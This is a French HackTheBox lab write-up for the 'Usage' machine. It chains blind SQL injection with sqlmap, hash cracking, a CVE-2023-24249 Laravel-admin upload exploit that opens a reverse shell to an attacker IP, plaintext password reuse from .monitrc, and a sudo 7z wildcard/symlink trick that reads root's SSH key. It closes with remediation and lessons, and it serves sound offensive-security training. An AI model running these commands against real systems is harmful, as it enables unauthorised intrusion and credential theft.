# Usage — HackTheBox

| | |
| --- | --- |
| **Plateforme** | HackTheBox |
| **OS** | Linux |
| **Difficulté** | 🟢 Easy |
| **Date** | 2026-10-13 |
| **Vecteur** | SQLi (reset password) → hash admin cracké → Laravel-admin **CVE-2023-24249** (upload → RCE) → clé SSH `dash` → mdp xander dans `.monitrc` → **sudo 7z wildcard** (lecture de la clé SSH root) |
| **CVE** | CVE-2023-24249 (Laravel-admin file upload) |
| **Tags** | web · sqli · laravel-admin · file-upload · password-reuse · 7z-wildcard · arbitrary-file-read |

> 🎯 **Nouveautés apprises** :
> 1) **SQLi blind** sur le reset password → `sqlmap` avec **`--csrf-token`/`--csrf-url`** (Laravel exige un `_token` frais → sinon 419).
> 2) **Laravel-admin 1.8.18** → CVE-2023-24249 (upload d'avatar mal filtré) → webshell → RCE.
> 3) **Réutilisation de mot de passe** : `.monitrc` lâche en clair un mdp réutilisé pour `xander`.
> 4) **Abus de 7z en sudo** : `7za a ... *` + un fichier `@nom` + symlink → **lecture de fichiers root** via les messages d'erreur.

---

## TL;DR
1. Vhost `admin.usage.htb` (ffuf). SQLi sur `/forget-password` (param `email`, blind) → dump `usage_blog.admin_users` → bcrypt admin → **whatever1**.
2. Login `admin.usage.htb/admin` (Laravel-admin 1.8.18) → **CVE-2023-24249** (upload) → reverse shell **dash**.
3. Clé SSH dans `~dash/.ssh/id_rsa` → SSH dash. `.monitrc` → mdp `allow admin:...` réutilisé → `su xander`.
4. `sudo -l` → `(ALL) NOPASSWD: /usr/bin/usage_management` → **7z wildcard** → lit `/root/.ssh/id_rsa` → `ssh root`.

## 1. Reconnaissance
```bash
┌──(kali㉿kali)-[~/nmap/Usage]
└─$ nmap -sC -sV -p- 10.129.121.223
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6
80/tcp open  http    nginx 1.18.0 (Ubuntu)      (redirige vers http://usage.htb/)

# /etc/hosts : 10.129.x.x usage.htb
┌──(kali㉿kali)-[~/nmap/Usage]
└─$ gobuster dir -u http://usage.htb -w /usr/share/wordlists/dirb/common.txt -b "404,403,302,503"
index.php            (Status: 200) [Size: 5181]
login                (Status: 200) [Size: 5141]

# vhost -> admin.usage.htb (ajouter aussi dans /etc/hosts)
┌──(kali㉿kali)-[~/nmap/Usage]
└─$ ffuf -w .../subdomains-top1million-5000.txt -u http://usage.htb -H "Host: FUZZ.usage.htb" -ac -t 20 -rate 50
admin                   [Status: 200, Size: 3304, ...]
```

## 2. Foothold — SQLi → admin → upload (CVE-2023-24249)
**SQLi sur le reset password** (param `email`, blind). Capture la requête `/forget-password` dans Burp (`forget.req`), avec le `_token` + cookie Laravel.
```bash
┌──(kali㉿kali)-[~/nmap/Usage]
└─$ sqlmap -r forget.req -p email --batch \
    --csrf-token="_token" --csrf-url="http://usage.htb/forget-password" -D usage_blog --tables
# -> table admin_users

└─$ sqlmap -r forget.req -p email --batch \
    --csrf-token="_token" --csrf-url="http://usage.htb/forget-password" -D usage_blog -T admin_users --dump
| id | name          | password                                                     | username |
| 1  | Administrator | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 | admin    |

└─$ echo '$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2' > hash.txt
└─$ john --wordlist=rockyou.txt hash.txt        # bcrypt -> whatever1
```
> **419** pendant le dump = CSRF Laravel → d'où `--csrf-token`/`--csrf-url` obligatoires (va chercher un `_token` neuf avant chaque requête).

**Laravel-admin 1.8.18** (`http://admin.usage.htb/admin`, login `admin:whatever1`) → vulnérable **CVE-2023-24249** (upload d'avatar mal filtré → webshell) :
```bash
└─$ git clone https://github.com/IDUZZEL/CVE-2023-24249-Exploit.git
└─$ python3 exploit.py -u http://admin.usage.htb -U admin -P whatever1 -i 10.10.14.236 -p 9001
[+] Reverse shell uploaded successfully! ... Check your listener at 10.10.14.236:9001
# -> shell dash
```

## 3. Latéral — clé SSH dash, puis mdp xander (.monitrc)
```bash
dash@usage:~/.ssh$ python3 -c 'import pty;pty.spawn("/bin/bash")'
# récupère ~dash/.ssh/id_rsa (ici exfiltré via python -m http.server)
└─$ chmod 600 id_rsa
└─$ ssh -i id_rsa dash@10.129.122.67        # SSH stable en dash

dash@usage:~$ cat .monitrc
set httpd port 2812
     use address 127.0.0.1
     allow admin:3nc0d3d_pa$$w0rd          # <-- mdp en clair, réutilisé pour xander

dash@usage:~$ su xander                      # mot de passe = celui du .monitrc
xander@usage:~$ sudo -l
User xander may run the following commands on usage:
    (ALL : ALL) NOPASSWD: /usr/bin/usage_management
```
> **monit** stocke ses creds web **en clair** dans `.monitrc` → classique de réutilisation de mot de passe vers un compte système.

## 4. Privesc — abus de 7z en sudo (lecture de fichiers root)

### 🧠 Comment on DÉDUIT l'astuce (le raisonnement, pas juste la commande)
1. `sudo -l` montre un **binaire maison** `usage_management` (inconnu) → il faut comprendre **ce qu'il fait**. On l'inspecte :
```bash
strings /usr/bin/usage_management | grep -iE '7z|tar|zip|/var|cp|mysql'
#   ... /usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -bb0 -bse0 -bsp0 /var/www/html/* ...
# (ou ltrace/strace pour voir l'appel réel)
```
2. On voit qu'il lance **`7za a ... /var/www/html/*`** : il archive le dossier web **avec un wildcard `*`**, **en root**.
3. Deux faits sur 7-Zip se combinent :
   - un argument commençant par **`@`** = « lis la **liste de fichiers** dans ce fichier » ;
   - quand `7za` n'arrive pas à ouvrir un fichier de la liste, il **affiche la ligne fautive dans un WARNING** → donc il recrache du **contenu**.
4. Le `*` fait que **tout fichier que JE crée dans `/var/www/html` devient un argument de 7z**. Donc si je crée un fichier nommé **`@id_rsa`**, 7z reçoit l'argument `@id_rsa` → il tente de lire `id_rsa` comme liste de fichiers. Si `id_rsa` est un **symlink vers `/root/.ssh/id_rsa`** (que 7z lit **en root**), chaque ligne de la clé est traitée comme un nom de fichier « introuvable » → **affichée dans l'erreur** = **lecture arbitraire root**.

> En une phrase : **wildcard → j'injecte des arguments** ; **`@fichier` → 7z lit un fichier** ; **erreur → il me montre son contenu**. Même famille que l'injection par wildcard (`tar --checkpoint`, `chown *`).

### L'exploitation
```bash
xander@usage:~$ cd /var/www/html
xander@usage:/var/www/html$ touch @id_rsa                     # devient l'argument @id_rsa pour 7z
xander@usage:/var/www/html$ ln -s /root/.ssh/id_rsa id_rsa    # id_rsa -> la clé root
xander@usage:/var/www/html$ sudo /usr/bin/usage_management
Enter your choice (1/2/3): 1                                  # Project Backup (celui qui 7z le dossier)
...
-----BEGIN OPENSSH PRIVATE KEY-----
WARNING: No more files
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
...
-----END OPENSSH PRIVATE KEY-----
```
→ la **clé SSH privée de root** s'affiche ligne par ligne dans les `WARNING`.

### Connexion root
```bash
┌──(kali㉿kali)-[~/nmap/Usage]
└─$ nano root_key          # coller la clé root (BEGIN -> END), recoller les lignes dans l'ordre
└─$ chmod 600 root_key
└─$ ssh -i root_key root@usage.htb      # -> root.txt
```

## 5. Remédiation
- **7z en sudo** : ne jamais archiver un dossier **inscriptible** avec un wildcard en root ; lister les fichiers explicitement, ou `cd` + chemin fixe, et `--` pour stopper le parsing d'options.
- **Laravel-admin** : mettre à jour (CVE-2023-24249), valider réellement le type de fichier uploadé (pas juste l'extension côté client).
- **SQLi** : requêtes préparées ; ne pas exposer le détail d'erreur.
- **monit** : ne pas stocker de creds en clair ; pas de réutilisation de mot de passe entre services et comptes système.

## 6. Leçons
- **Binaire sudo inconnu → l'inspecter** (`strings`/`ltrace`/`strace`) avant tout : c'est là qu'est la logique à abuser.
- **Wildcard + 7z** : `*` injecte des arguments, `@fichier` fait lire un fichier, l'erreur recrache le contenu → **lecture arbitraire root**. Famille « wildcard injection ».
- **`.monitrc`** = source classique de mot de passe en clair.
- **CSRF Laravel (419)** : sqlmap a besoin de `--csrf-token`/`--csrf-url` pour un token frais par requête.
- Un **symlink** permet de faire lire par un process privilégié un fichier auquel je n'ai pas accès.

## ⚠️ Pièges rencontrés
- `wget http://.../id_rsa .` → le `.` en trop fait un 2e download foireux (`http://.`) ; inutile, enlève-le.
- Copier la clé root depuis les `WARNING` : garder **l'ordre des lignes** et les lignes `BEGIN`/`END`, sinon `invalid format`.
- `chmod 600` sur la clé avant `ssh -i` (sinon « UNPROTECTED PRIVATE KEY »).

## Références
- Fiches liées : [commandes-utiles](../outils/commandes-utiles.md) · [linux-privesc](../outils/linux-privesc.md) · [burp](../outils/burp.md) · [hashcat](../outils/hashcat.md)
